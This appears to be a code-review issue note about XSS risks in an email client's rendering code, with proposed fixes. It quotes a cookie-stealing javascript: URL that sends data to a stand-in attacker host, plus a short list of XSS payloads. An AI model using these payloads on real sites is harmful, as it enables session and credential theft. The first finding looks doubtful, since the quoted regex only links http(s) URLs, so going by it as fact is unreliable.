---
status: pending
priority: p1
issue_id: "026"
tags: [code-review, security, xss]
dependencies: []
---

# XSS Vulnerabilities in Email Content Rendering

## Problem Statement

Email content is rendered without proper sanitization, allowing Cross-Site Scripting (XSS) attacks through:
1. Malicious URLs in `autoLinkUrls` function (javascript: and data: schemes)
2. Unsanitized email subject and body content
3. HTML special characters not escaped

**Why this matters:**
- Session hijacking via cookie theft
- Credential theft through fake login forms
- Malware distribution
- Account takeover

## Findings

**From Security Audit:**

### Vulnerability 1: JavaScript URLs in autoLinkUrls

**Location:** `ThreadDetail.tsx` lines 288-306

```typescript
function autoLinkUrls(text: string): (string | React.ReactElement)[] {
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  return text.split(urlRegex).map((part, i) => {
    if (part.match(urlRegex)) {
      return (
        <a
          key={i}
          href={part}  // ❌ NO VALIDATION - allows javascript: urls
          className="text-blue-600 hover:underline"
          target="_blank"
          rel="noopener noreferrer"
        >
          {part}
        </a>
      );
    }
    return part;
  });
}
```

**Attack Example:**
An attacker sends an email containing:
```
Check this out: javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)
```

When clicked, executes arbitrary JavaScript in victim's browser context.

### Vulnerability 2: Unsanitized Subject Rendering

**Location:** `ThreadDetail.tsx` line 479

```typescript
<span className="flex-1">{thread.subject}</span>
```

If subject contains `<script>alert('xss')</script>`, React will escape it, but other attack vectors exist:
- Deeply nested HTML injection
- SVG-based XSS

### Vulnerability 3: Email Body Rendering

**Location:** `ThreadDetail.tsx` lines 365-377

```typescript
{autoLinkUrls(line.replace(/^>\s*/, '') || '\u00A0')}
```

Email body passes through `autoLinkUrls` which creates `<a>` tags without URL validation.

## Proposed Solutions

### Option 1: URL Scheme Validation (Recommended)

**Pros:**
- Simple whitelist approach
- No external dependencies
- Protects against javascript:, data:, vbscript: attacks

**Cons:**
- Must maintain whitelist as new schemes emerge

**Effort:** Low (30 minutes)
**Risk:** Low

**Implementation:**
```typescript
function autoLinkUrls(text: string): (string | React.ReactElement)[] {
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  return text.split(urlRegex).map((part, i) => {
    if (part.match(urlRegex)) {
      // ✅ Validate URL scheme
      try {
        const url = new URL(part);
        if (!['http:', 'https:'].includes(url.protocol)) {
          return part; // Don't linkify non-http(s) URLs
        }
      } catch {
        return part; // Invalid URL, don't linkify
      }

      return (
        <a
          key={i}
          href={part}
          className="text-blue-600 hover:underline"
          target="_blank"
          rel="noopener noreferrer"
        >
          {part}
        </a>
      );
    }
    return part;
  });
}
```

### Option 2: DOMPurify Sanitization

**Pros:**
- Industry-standard library
- Handles all XSS vectors (not just URLs)
- Configurable sanitization rules

**Cons:**
- Adds dependency (~20KB)
- Overkill if only URLs are the issue

**Effort:** Medium (1 hour)
**Risk:** Low

**Implementation:**
```bash
npm install dompurify @types/dompurify
```

```typescript
import DOMPurify from 'dompurify';

function sanitizeEmailContent(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'a', 'br', 'strong', 'em'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOWED_URI_REGEXP: /^https?:\/\//
  });
}
```

### Option 3: Content Security Policy Headers

**Pros:**
- Defense-in-depth layer
- Prevents inline script execution even if XSS exists
- Protects against other attack vectors

**Cons:**
- Doesn't prevent XSS, just mitigates damage
- Must be combined with other solutions

**Effort:** Low (15 minutes)
**Risk:** Low

**Implementation:**
```typescript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self';"
          }
        ]
      }
    ];
  }
};
```

## Recommended Action

**Implement All Three Options (Defense in Depth)**

1. **Option 1** (URL validation) - Immediate fix for the most critical vulnerability
2. **Option 3** (CSP headers) - Add second layer of defense
3. **Option 2** (DOMPurify) - Only if emails contain rich HTML (not just plain text + URLs)

**Priority order:**
1. Fix `autoLinkUrls` with URL scheme validation (30 min)
2. Add CSP headers (15 min)
3. Evaluate if DOMPurify is needed based on email content types

## Technical Details

**Affected Files:**
- `/Users/benigeri/Projects/productiviy-system/email-workflow/app/inbox/ThreadDetail.tsx` (lines 288-306, 365-377, 479)
- `/Users/benigeri/Projects/productiviy-system/email-workflow/next.config.js` (add CSP headers)

**Related Attack Vectors:**
- JavaScript URLs: `javascript:alert('xss')`
- Data URLs: `data:text/html,<script>alert('xss')</script>`
- SVG with embedded script: `data:image/svg+xml,<svg onload=alert('xss')>`
- VBScript URLs (IE): `vbscript:msgbox('xss')`

**Browser Compatibility:**
- URL() constructor: All modern browsers
- CSP: All modern browsers
- DOMPurify: All browsers (polyfills included)

## Acceptance Criteria

- [ ] `autoLinkUrls` function validates URL scheme (http/https only)
- [ ] JavaScript URLs in email content do not become clickable links
- [ ] Data URLs in email content do not become clickable links
- [ ] CSP headers block inline script execution
- [ ] Email subject rendering is safe from XSS
- [ ] Email body rendering is safe from XSS
- [ ] Tests verify malicious URLs are not linkified
- [ ] Manual testing with sample XSS payloads passes

## Work Log

### 2026-01-11
- **Issue Created:** Security audit identified XSS vulnerabilities in email rendering
- **Severity:** P1 (BLOCKS MERGE) - Critical security vulnerability
- **Attack Surface:** Email content from untrusted senders
- **Next Step:** Implement URL scheme validation in autoLinkUrls function

## Resources

- [PR #78 - Draft Metadata Display](https://github.com/benigeri/productiviy-system/pull/78)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [URL() Constructor](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL)
